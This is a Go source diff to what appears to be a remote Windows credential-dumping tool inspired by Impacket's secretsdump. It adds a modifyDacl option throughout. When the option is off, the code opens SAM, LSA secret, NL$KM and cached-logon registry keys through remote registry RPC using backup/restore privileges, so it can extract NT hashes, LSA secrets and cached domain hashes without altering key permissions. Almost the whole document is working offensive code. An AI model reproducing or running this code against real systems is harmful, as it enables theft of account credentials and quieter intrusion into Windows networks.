@@ -486,13 +486,18 @@ func getBootKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
 	return
 }
 
-func getSysKey(rpccon *msrrp.RPCCon, base []byte) (sysKey []byte, err error) {
+func getSysKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (sysKey []byte, err error) {
 	var tmpSysKey []byte
 	_, err = getBootKey(rpccon, base)
 	if err != nil {
 		return
 	}
-	hSubKey, err := rpccon.OpenSubKey(base, `SAM\SAM\Domains\Account`)
+	var hSubKey []byte
+	if modifyDacl {
+		hSubKey, err = rpccon.OpenSubKey(base, `SAM\SAM\Domains\Account`)
+	} else {
+		hSubKey, err = rpccon.OpenSubKeyExt(base, `SAM\SAM\Domains\Account`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	}
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -601,7 +606,7 @@ func DecryptAESSysKey(bootKey, encSysKey, sysKeyIV []byte) (sysKey []byte, err e
 	return
 }
 
-func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string) (result []UserCreds, err error) {
+func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string, modifyDacl bool) (result []UserCreds, err error) {
 	result = make([]UserCreds, len(rids))
 	log.Debugf("Number users: %d\n", len(rids))
 	// Some entires have empty passwords or hash retrieval fails for some reason.
@@ -628,7 +633,12 @@ func getNTHash(rpccon *msrrp.RPCCon, base []byte, rids []string) (result []UserC
 		rid := binary.BigEndian.Uint32(ridBytes)
 		result[cntr].RID = rid
 
-		hSubKey, err := rpccon.OpenSubKey(base, ridStr)
+		var hSubKey []byte
+		if modifyDacl {
+			hSubKey, err = rpccon.OpenSubKey(base, ridStr)
+		} else {
+			hSubKey, err = rpccon.OpenSubKeyExt(base, ridStr, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+		}
 		if err != nil {
 			log.Errorln(err)
 			return nil, err
@@ -823,7 +833,7 @@ func decryptLSAKey(rpccon *msrrp.RPCCon, base []byte, data []byte) (result []byt
 	return
 }
 
-func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
+func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []byte, err error) {
 	if len(LSAKey) > 0 {
 		return
 	}
@@ -847,8 +857,12 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err erro
 	VistaStyle = true
 	var data []byte
 	log.Debugln("Decrypting LSA Key")
-
-	hSubKey, err := rpccon.OpenSubKey(base, `Security\Policy\PolEKList`)
+	var hSubKey []byte
+	if modifyDacl {
+		hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolEKList`)
+	} else {
+		hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolEKList`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	}
 	if err != nil {
 		if err == fmt.Errorf("ERROR_FILE_NOT_FOUND") {
 			VistaStyle = false
@@ -866,7 +880,11 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err erro
 	rpccon.CloseKeyHandle(hSubKey)
 
 	if !VistaStyle {
-		hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolSecretEncryptionKey`)
+		if modifyDacl {
+			hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolSecretEncryptionKey`)
+		} else {
+			hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolSecretEncryptionKey`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+		}
 		if err != nil {
 			if err == fmt.Errorf("ERROR_FILE_NOT_FOUND") {
 				log.Infoln("Could not find LSA Secret key")
@@ -900,9 +918,14 @@ func getLSASecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err erro
 }
 
 // Code inspired/partially stolen from Impacket's Secretsdump
-func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history bool) (secrets []printableLSASecret, err error) {
+func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) (secrets []printableLSASecret, err error) {
 	secretsPath := `SECURITY\Policy\Secrets`
-	keys, err := rpccon.GetSubKeyNames(base, secretsPath)
+	var keys []string
+	if modifyDacl {
+		keys, err = rpccon.GetSubKeyNames(base, secretsPath)
+	} else {
+		keys, err = rpccon.GetSubKeyNamesExt(base, secretsPath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	}
 	if err != nil {
 		log.Errorln(err)
 		return nil, err
@@ -914,7 +937,7 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history bool) (secrets []p
 
 	// GetLSASecretKey
 	log.Debugln("Getting LSASecretKey")
-	_, err = getLSASecretKey(rpccon, base)
+	_, err = getLSASecretKey(rpccon, base, modifyDacl)
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -937,7 +960,12 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history bool) (secrets []p
 		var secret []byte
 		for _, valueType := range valueTypeList {
 			log.Debugf("Retrieving value: %s\\%s\\%s\n", secretsPath, key, valueType)
-			hSubKey, err := rpccon.OpenSubKey(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType))
+			var hSubKey []byte
+			if modifyDacl {
+				hSubKey, err = rpccon.OpenSubKey(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType))
+			} else {
+				hSubKey, err = rpccon.OpenSubKeyExt(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType), msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+			}
 			if err != nil {
 				log.Errorln(err)
 				return nil, err
@@ -986,13 +1014,18 @@ func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history bool) (secrets []p
 	return
 }
 
-func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err error) {
+func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []byte, err error) {
 	if len(NLKMKey) > 0 {
 		return
 	}
 
 	log.Debugln("Decrypting NL$KM")
-	hSubKey, err := rpccon.OpenSubKey(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`)
+	var hSubKey []byte
+	if modifyDacl {
+		hSubKey, err = rpccon.OpenSubKey(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`)
+	} else {
+		hSubKey, err = rpccon.OpenSubKeyExt(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	}
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -1027,10 +1060,15 @@ func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte) (result []byte, err err
 	return
 }
 
-func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte) (result []string, err error) {
+func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []string, err error) {
 	baseKeyPath := `Security\Cache`
 	var names []string
-	hSubKey, err := rpccon.OpenSubKey(base, baseKeyPath)
+	var hSubKey []byte
+	if modifyDacl {
+		hSubKey, err = rpccon.OpenSubKey(base, baseKeyPath)
+	} else {
+		hSubKey, err = rpccon.OpenSubKeyExt(base, baseKeyPath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
+	}
 	if err != nil {
 		log.Errorln(err)
 		return
@@ -1074,12 +1112,12 @@ func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte) (result []string, err er
 		}
 	}
 
-	_, err = getLSASecretKey(rpccon, base)
+	_, err = getLSASecretKey(rpccon, base, modifyDacl)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
-	_, err = getNLKMSecretKey(rpccon, base)
+	_, err = getNLKMSecretKey(rpccon, base, modifyDacl)
 	if err != nil {
 		log.Errorln(err)
 		return
